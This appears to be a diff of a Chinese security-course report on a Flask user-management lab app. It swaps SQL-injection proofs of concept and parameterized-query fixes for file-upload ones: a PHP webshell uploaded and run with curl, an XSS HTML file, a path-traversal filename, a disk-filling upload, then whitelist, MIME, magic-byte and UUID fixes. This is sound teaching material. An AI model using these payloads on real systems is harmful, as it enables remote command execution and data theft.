@@ -267,133 +267,168 @@ tr:nth-child(even) {
     <div class="line"></div>
     <h1>用户信息管理平台</h1>
     <div class="subtitle">安全漏洞挖掘与修复报告</div>
-    <div class="url">http://192.168.43.129:5000</div>
+    <div class="url">http://10.133.25.191:5000</div>
     <hr class="divider">
     <div class="meta">
-        <strong>项目版本：</strong>V4.0 — SQL注入漏洞修复专题<br>
-        <strong>报告日期：</strong>2026年7月8日<br>
-        <strong>今日课程：</strong>Day2:SQL注入漏洞挖掘与修复<br>
-        <strong>技术栈：</strong>Python Flask / SQLite / 参数化查询 / POC验证<br>
-        <strong>安全评级：</strong><span class="stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>  25项防护全部通过
+        <strong>项目版本：</strong>V5.0 — 文件上传漏洞修复专题<br>
+        <strong>报告日期：</strong>2026年7月9日<br>
+        <strong>今日课程：</strong>Day3:文件上传漏洞深度解析与安全防护<br>
+        <strong>技术栈：</strong>Python Flask / 文件上传 / 魔数校验 / UUID重命名<br>
     </div>
     <div class="line-bottom"></div>
 </div>
 
 <!-- ============================================================
-     一、SQL注入漏洞专题
+     一、漏洞分析（文件上传）
      ============================================================ -->
 <div class="page">
-    <h2>一、SQL注入漏洞专题</h2>
-    <p>第2天课程内容为 SQL 注入漏洞的挖掘与修复。系统在上次迭代中新增了注册和搜索功能，但使用了 f-string 字符串拼接 SQL 语句，故意留下了注入漏洞。</p>
+    <h2>一、漏洞分析（文件上传）</h2>
+    <p>在已完成的用户管理系统中新增了头像上传功能。由于最初未做任何安全校验，存在以下4个严重漏洞：</p>
 
-    <h3>4.1 漏洞位置</h3>
+    <h3>1.1 漏洞位置</h3>
     <table>
         <tr><th>功能</th><th>路由</th><th>漏洞代码</th></tr>
-        <tr><td>用户注册</td><td>/register</td><td class="code">f"INSERT INTO users VALUES ('{username}',...)"</td></tr>
-        <tr><td>用户搜索</td><td>/search</td><td class="code">f"SELECT ... WHERE username LIKE '%{keyword}%'"</td></tr>
+        <tr><td>头像上传</td><td>/upload</td><td class="code">file.save(os.path.join(UPLOAD_DIR, file.filename))</td></tr>
     </table>
 
-    <h3>4.2 POC 验证（注入成功）</h3>
+    <h3>1.2 POC 验证</h3>
 
-    <h4>POC 1：UNION 注入</h4>
-    <div class="code-block"># 输入
-keyword = ' UNION SELECT 1,'inj','inj@x.com','138'--
+    <h4>POC 1：上传 PHP Webshell（高危）</h4>
+    <div class="code-block"># 上传一个PHP一句话木马
+echo '&lt;?php system($_GET["cmd"]); ?>' > shell.php
+curl -F "file=@shell.php" http://目标/upload
 
-# 生成的 SQL
-SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
+# 访问上传后的文件执行命令
+curl http://目标/static/uploads/shell.php?cmd=id
 
-# 结果：搜索结果中出现 "inj" 用户 ✅</div>
+# 结果：成功执行系统命令 ✅</div>
 
-    <h4>POC 2：OR 万能条件</h4>
-    <div class="code-block"># 输入
-keyword = ' OR '1'='1
+    <h4>POC 2：上传 HTML 恶意页面（高危）</h4>
+    <div class="code-block"># 上传包含XSS的HTML文件
+echo '&lt;script>alert(document.cookie)&lt;/script>' > xss.html
+curl -F "file=@xss.html" http://目标/upload
 
-# 生成的 SQL
-SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
+# 用户访问该HTML时，XSS脚本被执行
+# 结果：HTML文件可被直接访问 ✅</div>
 
-# 结果：返回 users 表中全部用户数据 ✅</div>
+    <h4>POC 3：路径穿越攻击（中危）</h4>
+    <div class="code-block"># 文件名包含 ../ 可穿越到其他目录
+curl -F "file=@test.txt;filename=../../evil.txt" http://目标/upload
 
-    <h4>POC 3：注册功能注入</h4>
-    <div class="code-block"># 输入
-username = hacker', 'pass', 'h@x.com', '123')--
+# 结果：文件被保存到上层目录 ✅</div>
 
-# 生成的 SQL
-INSERT INTO users VALUES ('hacker', 'pass', 'h@x.com', '123')--',...)
+    <h4>POC 4：超大型文件上传（中危）</h4>
+    <div class="code-block"># 上传超过限制的大文件
+dd if=/dev/zero of=bigfile.bin bs=1M count=20
+curl -F "file=@bigfile.bin" http://目标/upload
 
-# 结果：恶意数据写入数据库 ✅</div>
+# 结果：耗尽服务器磁盘空间 ✅</div>
+</div>
 
-    <h3>4.3 修复方案</h3>
-    <p>将 f-string 拼接 SQL 改为<strong>参数化查询</strong>（Prepared Statement），根本性防止 SQL 注入：</p>
+<!-- ============================================================
+     二、修复方案
+     ============================================================ -->
+<div class="page">
+    <h2>二、修复方案</h2>
+    <p>针对上述4个漏洞，实施以下4层防护措施：</p>
 
-    <div class="code-block">// ❌ 修复前：f-string 拼接（存在注入）
-sql = f"SELECT ... WHERE username LIKE '%{keyword}%'"
+    <h3>2.1 后缀名白名单</h3>
+    <div class="code-block"># 只允许图片后缀
+ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp"}
 
-// ✅ 修复后：参数化查询（安全）
-sql = "SELECT ... WHERE username LIKE ?"
-cursor.execute(sql, (like_pattern,))</div>
+# 校验逻辑
+if "." not in filename or ext not in ALLOWED_EXTENSIONS:
+    return "不支持的文件类型"</div>
 
-    <h3>4.3 修复前后代码对比</h3>
+    <h3>2.2 MIME 类型校验</h3>
+    <div class="code-block"># 只允许图片MIME
+ALLOWED_MIMETYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}
+
+# 校验逻辑
+if file.content_type not in ALLOWED_MIMETYPES:
+    return "不支持的文件类型"</div>
+
+    <h3>2.3 文件头魔数校验</h3>
+    <div class="code-block"># 读取文件头部字节验证真实格式
+header = file.read(8)
+is_valid = (
+    header[:4] == b"\x89PNG" or      # PNG
+    header[:2] in (b"\xff\xd8",) or  # JPEG
+    header[:3] == b"GIF" or            # GIF
+    header[:4] == b"RIFF"              # WEBP
+)
+if not is_valid:
+    return "文件内容不是有效图片"</div>
+
+    <h3>2.4 UUID 重命名防路径穿越</h3>
+    <div class="code-block"># 使用UUID重命名文件，彻底杜绝路径穿越
+import uuid
+safe_filename = f"{uuid.uuid4().hex}.{ext}"
+filepath = os.path.join(UPLOAD_DIR, safe_filename)
+file.save(filepath)</div>
+</div>
+
+<!-- ============================================================
+     三、修复前后对比
+     ============================================================ -->
+<div class="page">
+    <h2>三、修复前后对比</h2>
+
     <table>
-        <tr><th style="width:15%">功能</th><th style="width:42%">修复前（f-string拼接）</th><th style="width:43%">修复后（参数化查询）</th></tr>
+        <tr><th style="width:18%">防护层</th><th style="width:41%">修复前</th><th style="width:41%">修复后</th></tr>
         <tr>
-            <td><strong>注册</strong></td>
-            <td class="code">f"INSERT INTO users VALUES ('{username}','{password}','{email}','{phone}')"</td>
-            <td class="code">sql = "INSERT INTO users VALUES (?,?,?,?)"<br>cursor.execute(sql, (username,password,email,phone))</td>
+            <td><strong>后缀校验</strong></td>
+            <td class="code">无校验，任意后缀均可上传</td>
+            <td class="code">白名单: png/jpg/jpeg/gif/webp</td>
         </tr>
         <tr>
-            <td><strong>搜索</strong></td>
-            <td class="code">f"SELECT ... WHERE username LIKE '%{keyword}%'"</td>
-            <td class="code">sql = "SELECT ... WHERE username LIKE ?"<br>cursor.execute(sql, (like_pattern,))</td>
+            <td><strong>MIME校验</strong></td>
+            <td class="code">无校验</td>
+            <td class="code">仅允许image/*类型</td>
+        </tr>
+        <tr>
+            <td><strong>内容校验</strong></td>
+            <td class="code">无校验</td>
+            <td class="code">读取文件头魔数验证真实格式</td>
+        </tr>
+        <tr>
+            <td><strong>文件命名</strong></td>
+            <td class="code">原始文件名，可路径穿越</td>
+            <td class="code">UUID重命名，防穿越</td>
         </tr>
     </table>
 
-    <h3>4.4 Burp Suite 测试方法</h3>
-    <p>使用 Burp Suite 抓包后修改 keyword 参数测试注入：</p>
-    <div class="code-block">1. 登录后拦截 GET /search?keyword=admin 请求
-2. 发送到 Repeater
-3. 修改 keyword 参数值测试注入：
-   admin' OR '1'='1          → 返回全部用户
-   ' UNION SELECT 1,2,3,4--  → 返回自定义数据</div>
-
-    <h3>4.5 修复后验证</h3>
+    <h3>修复后验证结果</h3>
     <table>
-        <tr><th>测试</th><th>修复前</th><th>修复后</th></tr>
-        <tr><td>POC 1 UNION 注入</td><td>返回 "inj" 数据</td><td class="green bold">[OK] 注入无效，搜索结果为0</td></tr>
-        <tr><td>POC 2 OR 万能条件</td><td>返回全部用户</td><td class="green bold">[OK] 注入无效，正常搜索</td></tr>
-        <tr><td>POC 3 注册注入</td><td>SQL代码被执行</td><td class="green bold">[OK] 注入内容成为普通用户名</td></tr>
+        <tr><th>POC测试</th><th>修复前</th><th>修复后</th></tr>
+        <tr><td>PHP webshell</td><td>上传成功并可访问</td><td class="green bold">[OK] 拦截非法后缀</td></tr>
+        <tr><td>HTML恶意页面</td><td>上传成功并可访问</td><td class="green bold">[OK] 拦截非法后缀</td></tr>
+        <tr><td>正常JPG图片</td><td>上传成功</td><td class="green bold">[OK] UUID重命名保存</td></tr>
     </table>
 </div>
 
 <!-- ============================================================
-     二、总结
+     四、总结
      ============================================================ -->
 <div class="page">
-    <h2>二、总结</h2>
-    <p class="no-indent">本次SQL注入漏洞修复专题，针对注册和搜索功能中的 f-string 拼接SQL漏洞进行了全面修复：</p>
+    <h2>四、总结</h2>
+    <p class="no-indent">文件上传漏洞是Web安全中的经典高风险漏洞，本次修复采用了"纵深防御"策略：</p>
 
     <table>
-        <tr>
-            <th>课程内容</th>
-            <th>受影响功能</th>
-            <th>漏洞类型</th>
-            <th>修复措施</th>
-        </tr>
-        <tr>
-            <td>SQL注入</td>
-            <td>注册 / 搜索</td>
-            <td>f-string拼接SQL</td>
-            <td>参数化查询(Prepared Statement)</td>
-        </tr>
+        <tr><th>防御层次</th><th>防御手段</th><th>防范的威胁</th></tr>
+        <tr><td>第1层</td><td>后缀白名单</td><td>阻止 .php .exe .html 等非图片文件</td></tr>
+        <tr><td>第2层</td><td>MIME校验</td><td>阻止 Content-Type 伪造的攻击文件</td></tr>
+        <tr><td>第3层</td><td>文件头魔数校验</td><td>阻止改后缀名的虚假图片</td></tr>
+        <tr><td>第4层</td><td>UUID重命名</td><td>阻止路径穿越和文件名冲突</td></tr>
     </table>
 
-    <p style="margin-top: 4mm;">核心原理：参数化查询将 SQL 语句与用户输入的数据分离，数据库先编译 SQL 结构（SELECT、INSERT 等），再将用户输入作为"纯数据"填入。即使用户输入包含恶意 SQL 代码，也不会被数据库执行，从根源消除注入风险。</p>
+    <p style="margin-top: 4mm;">核心安全原则：永远不要信任用户输入。文件名、后缀、MIME类型、文件内容都需要层层校验，缺一不可。</p>
 
     <br>
     <hr style="border: none; border-top: 1px solid #2980b9; width: 60%; margin: 8mm auto;">
     <p style="text-align: center; color: #95a5a6; text-indent: 0;">&mdash; 报告完 &mdash;</p>
-    <p style="text-align: center; color: #bbb; font-size: 8pt; text-indent: 0;">报告日期: 2026-07-08 | 课程: SQL注入漏洞修复 | 安全标准: OWASP</p>
+    <p style="text-align: center; color: #bbb; font-size: 8pt; text-indent: 0;">报告日期: 2026-07-09 | 课程: 文件上传漏洞 | 防御策略: 纵深防御</p>
 </div>
-
 </body>
 </html>
 """
